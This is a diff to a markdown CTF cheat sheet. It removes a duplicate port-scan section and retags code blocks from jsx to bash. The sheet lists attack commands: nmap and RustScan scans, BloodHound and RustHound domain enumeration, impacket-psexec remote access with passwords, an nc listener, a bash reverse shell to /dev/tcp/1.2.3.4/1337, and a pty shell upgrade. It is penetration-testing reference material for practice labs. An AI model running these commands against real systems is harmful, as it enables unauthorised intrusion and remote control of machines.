@@ -9,20 +9,6 @@ title: CTF Cheat Sheet
 * TOC
 {:toc}
 
-## PortScan
-
-### Namp
-```bash
-nmap <target> -sC -sV -p- -T4 -vv -oA target
-```
-
-### RustScan
-```bash
-rustscan -a <target> -- -sCV -oA target
-```
-
-# CFT CheatSheet
-
 # PortScan
 
 ```bash
@@ -39,31 +25,31 @@ $ smbclient //server/share -U username%password
 
 # BloodHound
 
-```jsx
+```bash
 $ sudo ./bloodhound containers start
 ```
 
 ## RustHound
 
-```jsx
+```bash
 $ rusthound-ce --domain <domain_name> -u <username> -p <password>
 ```
 
 # Remote Access
 
-```jsx
+```bash
 $ impacket-psexec <domain_name>/<username>:'<password>'@<target_ip>
 ```
 
 # Web Server
 
-```jsx
+```bash
 $ python3 -m http.server 8080 -d directory
 ```
 
 # Listener
 
-```jsx
+```bash
 rlwrap nc -nvlp 1337
 
 rlwrap will enhance the shell, allowing you to clear the screen with [CTRL] + [L].
@@ -71,7 +57,7 @@ rlwrap will enhance the shell, allowing you to clear the screen with [CTRL] + [L
 
 # Reverse Shell
 
-```jsx
+```bash
 'bash -c "bash -i >& /dev/tcp/1.2.3.4/1337 0>&1"'
 
 python3 -c 'import pty;pty.spawn("/bin/bash")'
